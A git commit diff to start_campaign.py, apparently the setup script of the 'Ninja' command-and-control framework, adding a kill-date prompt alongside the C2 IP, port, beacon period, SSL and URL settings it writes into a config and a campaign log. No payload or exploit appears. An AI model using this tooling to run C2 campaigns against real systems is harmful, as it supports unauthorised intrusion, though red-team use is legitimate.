9d599f66d413a57d1190fa741d6ac2f3fbfa5946
darkz3ro <darkz3ro@localhost.localdomain>
2020-06-13 13:49:42 +0300

    added kill date function

--- start_campaign.py
+++ start_campaign.py
@@ -7,7 +7,7 @@ PORT=''
 SSL=''
 cert=''
 key=''
-
+date=''
 def initiate_url():
     global Urls
     #list_full=['path','pdf','perl','perl5','personal','personals','pgsql','phone','php','phpmyadmin','phpMyAdmin','pics','ping','pix','pl','pls','plx','pol','policy','poll','pop','portal','portlet','portlets','post','postgres','power','press','preview','print','printenv','priv','private','privs','process','processform','prod','production','products','professor','profile','program','project','proof','properties','protect','protected','proxy','ps','pub','public','publish','publisher','purchase','purchases','put','pw','pwd','python','queries','query','queue','quote','ramon','random','rank','rcs','readme','redir','redirect','reference','references','reg','reginternal','regional','register','registered','release','remind','reminder','remote','removed','report','reports','requisite','research','reseller','resource','resources','responder','restricted','retail','right','robot','robotics','root','route','router','rpc','rss','rules','run','sales','sample','samples','save','saved','schema','scr','scratc','script','scripts','sdk','search','secret','secrets','section','sections','secure','secured','security','select','sell','send','sendmail','sensepost','sensor','sent','server','servers','server_stats','service','services','servlet','Servlet','servlets','Servlets','session','sessions','set','setting','settings','setup','share','shared','shell','shit','shop','shopper','show','showcode','shtml','sign','signature','signin','simple','single','site','sitemap','sites','SiteServer','small','snoop','soap','soapdocs','software','solaris','solutions','somebody','source','sources','Sources','spain','spanish','sql','sqladmin','src','srchad','srv','ssi','ssl','staff','start','startpage','stat','statistic','statistics','Statistics','stats','Stats','status','stop','store','story','string','student','stuff','style','stylesheet','stylesheets','submit','submitter','sun','super','support','supported','survey','svc','svn','svr','sw','sys','sysadmin','system','table','tag','tape','tar','target','tech','temp','template','templates','temporal','temps','terminal','test','testing','tests','text','texts','ticket','tmp','today','tool','toolbar','tools','top','topics','tour','tpv','trace','traffic','transaction','transactions','transfer','transport','trap','trash','tree','trees','tutorial','uddi','uninstall','unix','up','update','updates','upload','uploader','uploads','usage','user','users','usr','ustats','util','utilities','utility','utils','validation','validatior','vap','var','vb','vbs','vbscript','vbscripts','vfs','view','viewer','views','virtual','visitor','vpn','w','w3','w3c','W3SVC','W3SVC1','W3SVC2','W3SVC3','warez','wdav','web','webaccess','webadmin','webapp','webboard','webcart','webdata','webdav','webdist','webhits','WEB-INF','weblog','weblogic','weblogs','webmail','webmaster','websearch','webservice','webservices','website','webstat','webstats','webvpn','welcome','wellcome','whatever','whatnot','whois','will','win','windows','word','work','workplace','workshop','ws','wstats','wusage','www','wwwboard','wwwjoin','wwwlog','wwwstats','xcache','xfer','xml','xmlrpc','xsl','xsql','xyz','zap','zip','zipfiles','zips']
@@ -73,26 +73,38 @@ def get_beacon():
     beacon=CC
 
 def update_template():
-    global beacon,IP,PORT,Urls
+    global beacon,IP,PORT,Urls,date
     template=open("core/config.template","r")
     config=open("core/config.py","w")
     data=template.read()
-    data=data.replace('{IP}', IP).replace('{beacon_time}', beacon).replace('{PORT}', PORT).replace('{URL}', Urls).replace('{SSL}', SSL).replace('{CERT}', cert).replace('{KEY}', key)
+    data=data.replace('{IP}', IP).replace('{beacon_time}', beacon).replace('{PORT}', PORT).replace('{URL}', Urls).replace('{SSL}', SSL).replace('{CERT}', cert).replace('{KEY}', key).replace('{KDATE}', date)
     config.write(data)
     config.close()
     template.close()
     print "Everything Done you can run ninja by : python Ninja.py"
 
 def log_campaign():
-    global beacon,IP,PORT,Urls
+    global beacon,IP,PORT,Urls,date
     Log="=================================================================================\n"
     Log+="==========================New Campaign==========================================\n"
     Log+="Urls for this campaign  :\n"+Urls
     Log+="IP/Domain:Port for this Campaign : \n"+IP+":"+PORT+"\n"
     Log+="Beacon period for this campaign : "+beacon+"\n\n\n"
+    Log+="kill date for this campaign : "+date+"\n\n\n"
     file=open("c2-logs.txt","a+")
     file.write(Log)
     file.close()
+
+def kill_date():
+    global date
+    CC=''
+    while len(CC) == 0:
+        CC = raw_input('please enter kill date for this campaign ( format dd/MM/yyyy ) ? ')
+        if CC.split("/")>2:
+            date=CC
+            break
+        else:
+            continue
 
 def get_ssl():
     global SSL,key,cert
@@ -132,6 +144,7 @@ if __name__ == '__main__':
         initiate_url()
         get_ip()
         get_beacon()
+        kill_date()
         get_ssl()
         update_template()
         log_campaign()
